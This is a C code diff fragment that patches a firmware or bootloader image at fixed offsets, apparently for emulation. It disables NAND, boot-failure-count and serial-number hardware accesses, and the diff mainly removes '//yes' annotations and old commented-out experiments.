+    *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1;
+    *(uint32_t *)(image + 0x18122) = INSN2_MOV_R0_1__MOV_R0_1;
 #if DEBUG_MALLOC
     /* make main_task show SP */
-    *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13); //yes
-    *(uint8_t *)(image + 0x32CA4) = 'x'; //yes
+    *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13);
+    *(uint8_t *)(image + 0x32CA4) = 'x';
     /* show task structure */
-    *(void **)(image + 0xFA4) = image + 0x41330; //yes
-    *(uint8_t *)(image + 0x32C90) = 'x'; //yes
+    *(void **)(image + 0xFA4) = image + 0x41330;
+    *(uint8_t *)(image + 0x32C90) = 'x';
 #endif
     /* nop NAND */
-    *(uint32_t *)(image + 0x1D940) = INSN2_NOP__NOP; //yes
+    *(uint32_t *)(image + 0x1D940) = INSN2_NOP__NOP;
     /* nop 0x832000xx (boot failure count) */
 #if !USE_SIGNAL
-    *(uint16_t *)(image + 0x09730) = INSNT_NOP; //yes
-    *(uint16_t *)(image + 0x09736) = INSNT_NOP; //yes
-    *(uint16_t *)(image + 0x0973C) = INSNT_NOP; //yes
-    *(uint16_t *)(image + 0x09742) = INSNT_NOP; //yes
-    *(uint16_t *)(image + 0x0975A) = INSNT_NOP; //yes
-    *(uint16_t *)(image + 0x09766) = INSNT_NOP; //yes
+    *(uint16_t *)(image + 0x09730) = INSNT_NOP;
+    *(uint16_t *)(image + 0x09736) = INSNT_NOP;
+    *(uint16_t *)(image + 0x0973C) = INSNT_NOP;
+    *(uint16_t *)(image + 0x09742) = INSNT_NOP;
+    *(uint16_t *)(image + 0x0975A) = INSNT_NOP;
+    *(uint16_t *)(image + 0x09766) = INSNT_NOP;
 #endif /* !USE_SIGNAL */
     *(uint16_t *)(image + 0x09772) = INSNT_NOP;
 
     /* nop some more hw */
-    *(uint32_t *)(image + 0x1D8F0) = INSN2_RETURN_0; //yes
-    *(uint32_t *)(image + 0x1D8DE) = INSN2_NOP__NOP; //yes
-    *(uint32_t *)(image + 0x1D8E2) = INSN2_NOP__NOP; //yes
+    *(uint32_t *)(image + 0x1D8F0) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1D8DE) = INSN2_NOP__NOP;
+    *(uint32_t *)(image + 0x1D8E2) = INSN2_NOP__NOP;
 #if !USE_SIGNAL
     /* nop 0xbf106000, 0xbf50000{0,8,c} (serial number) */
-    *(uint32_t *)(image + 0x1DEF0) = INSN2_RETURN_0; //yes
-    *(uint32_t *)(image + 0x1DE8E) = INSN2_RETURN_0; //yes
-    *(uint32_t *)(image + 0x1DEAE) = INSN2_RETURN_0; //yes
-    *(uint32_t *)(image + 0x1DE7E) = INSN2_RETURN_0; //yes
-    *(uint32_t *)(image + 0x1DD48) = INSN2_RETURN_0; //yes
-    *(uint32_t *)(image + 0x1DF08) = INSN2_RETURN_0; //yes
+    *(uint32_t *)(image + 0x1DEF0) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1DE8E) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1DEAE) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1DE7E) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1DD48) = INSN2_RETURN_0;
+    *(uint32_t *)(image + 0x1DF08) = INSN2_RETURN_0;
 #endif /* !USE_SIGNAL */
-    
-    //*(uint16_t *)(image + 0x22F8C) = INSNT_NOP; //problem1
-    //-->
-    //*(uint16_t *)(image + 0x22E54) = INSNT_NOP; //no issues
-    //*(uint16_t *)(image + 0x22E64) = INSNT_NOP; //no issues
-    //*(uint16_t *)(image + 0x22E7E) = INSNT_NOP; //<-- here is the problem, if we need to pump NODE_SIZE mount->cookie->fs->ops->open(mount->cookie->ctxt, shortpath, flags) will fail
 }
 
 
